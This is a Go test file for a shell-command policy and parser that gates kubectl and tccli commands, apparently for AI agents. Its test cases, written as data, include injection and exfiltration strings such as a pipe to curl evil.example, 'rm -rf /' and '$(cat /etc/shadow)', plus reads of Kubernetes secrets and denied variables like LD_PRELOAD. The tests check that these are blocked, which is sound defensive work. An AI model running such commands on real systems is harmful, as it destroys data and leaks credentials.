package execution

import (
	"reflect"
	"strings"
	"testing"
)

func TestPolicyChecksAllSegmentsAndStrictestRule(t *testing.T) {
	rules := []Rule{{Name: "broad-kubectl", Pattern: []string{"kubectl"}, Decision: Allow}, {Name: "review-logs", Pattern: []string{"kubectl", "logs"}, Decision: Prompt}}
	for _, test := range []struct {
		command string
		want    Decision
	}{
		{"kubectl get pods", Allow},
		{"kubectl logs service", Prompt},
		{"kubectl get pods | curl https://evil.example", Prompt},
		{"kubectl get pods && kubectl delete pod old", Forbidden},
		{"kubectl get pods || sudo kubectl get pods", Forbidden},
		{"kubectl get pods; rm -rf /", Forbidden},
		{"kubectl rollout restart deployment/api", Prompt},
		{"tccli cls DescribeTopics --Region ap-shanghai", Allow},
		{"tccli cls SearchLog --Query 'status:500 AND path:*'", Allow},
		{"tccli cls DeleteTopic --TopicId abc", Forbidden},
		{"tccli cls ModifyTopic --TopicId abc", Prompt},
		{"tccli cls ModifyTopic --TopicName help", Prompt},
		{"kubectl --namespace=team scale deployment/x --replicas=2", Prompt},
		{"tccli cls DescribeTopics --https-proxy=https://evil.example", Forbidden},
		{"tccli cls DescribeTopics --secretKey leaked", Forbidden},
		{"tccli cls help", Allow},
		{"python3 -c 'print(1)'", Prompt},
		{"kubectl get secrets.v1 -o json", Forbidden},
		{"kubectl get --raw=/api/v1/secrets", Forbidden},
		{"kubectl get pods --context=other", Forbidden},
		{"kubectl -n app get secrets", Forbidden},
		{"kubectl --namespace=app describe secrets.v1/name", Forbidden},
		{"kubectl -n app config view", Forbidden},
		{"kubectl -n app get pods,secrets/name", Forbidden},
		{"tccli --region ap-guangzhou cls DeleteTopic", Forbidden},
		{"tccli cls --region ap-guangzhou DeleteTopic", Forbidden},
		{"tccli --region=ap-guangzhou cvm TerminateInstances", Forbidden},
		{"tccli --profile=other", Forbidden},
	} {
		t.Run(test.command, func(t *testing.T) {
			if got := Evaluate(test.command, rules); got.Decision != test.want {
				t.Fatalf("got %+v want %s", got, test.want)
			}
		})
	}
}

func TestParserRejectsHiddenExecution(t *testing.T) {
	for _, input := range []string{
		"kubectl get pods $(cat /etc/shadow)", "kubectl get pods `id`", "kubectl get pods > /tmp/x",
		"kubectl get pods\nrm -rf /", "kubectl get pods &", "kubectl get pods <<< x", "(kubectl get pods)",
		"KEY=x kubectl get pods", "env kubectl get pods", "/usr/bin/kubectl get pods", "kubectl get $RESOURCE",
		"kubectl get pods &&", "kubectl get *", "kubectl get \"unclosed", "kubectl get pods;",
		"kubectl get pods | | cat", "kubectl get pods\x00",
	} {
		t.Run(input, func(t *testing.T) {
			if got := Evaluate(input, nil); got.Decision != Forbidden {
				t.Fatalf("hidden execution allowed: %+v", got)
			}
		})
	}
}

func TestLiteralArgumentsSurviveReconstruction(t *testing.T) {
	input := `tccli cls SearchLog --Query 'a; $(touch /tmp/never) | b' --TopicId "a b" && kubectl get pods`
	c, err := Parse(input)
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"tccli", "cls", "SearchLog", "--Query", "a; $(touch /tmp/never) | b", "--TopicId", "a b"}; !reflect.DeepEqual(c.Segments[0], want) {
		t.Fatalf("args %q", c.Segments[0])
	}
	reparsed, err := Parse(c.Script())
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(c, reparsed) {
		t.Fatalf("reconstruction changed argv: %q", c.Script())
	}
}

func FuzzParseReconstruction(f *testing.F) {
	for _, s := range []string{"kubectl get pods", "tccli cls SearchLog --Query 'hello'", "echo 'a'\"'\"'b' | wc -c"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		parsed, err := Parse(s)
		if err != nil {
			return
		}
		again, err := Parse(parsed.Script())
		if err != nil || !reflect.DeepEqual(parsed, again) {
			t.Fatalf("unsafe roundtrip %q: %+v %v", s, again, err)
		}
	})
}

func TestConfigRejectsEnvironmentAndIdentityChanges(t *testing.T) {
	for _, key := range []string{"PATH", "HOME", "BASH_ENV", "ENV", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "PYTHONPATH", "NODE_OPTIONS", "IFS", "DOCKER_HOST", "DOCKER_CONTEXT"} {
		c := testConfig()
		c.Profiles[0].Env = map[string]string{key: "SOURCE"}
		if c.Validate() == nil {
			t.Errorf("unsafe env %s accepted", key)
		}
	}
	c := testConfig()
	c.Profiles[0].Env = map[string]string{"TOKEN": "actual secret text"}
	if c.Validate() == nil {
		t.Fatal("literal secret accepted as source name")
	}
	c = testConfig()
	c.Profiles[0].Agents = nil
	if c.Validate() == nil {
		t.Fatal("implicit all-agent grant")
	}
	if text := testConfig().Instruction("other"); text != "" {
		t.Fatal("unassigned agent got instruction")
	}
	c = testConfig()
	c.Profiles[0].Env = map[string]string{"TOKEN": "SECRET_SOURCE"}
	if text := c.Instruction("ops"); strings.Contains(text, "SECRET_SOURCE") || !strings.Contains(text, "TOKEN") {
		t.Fatal(text)
	}
}
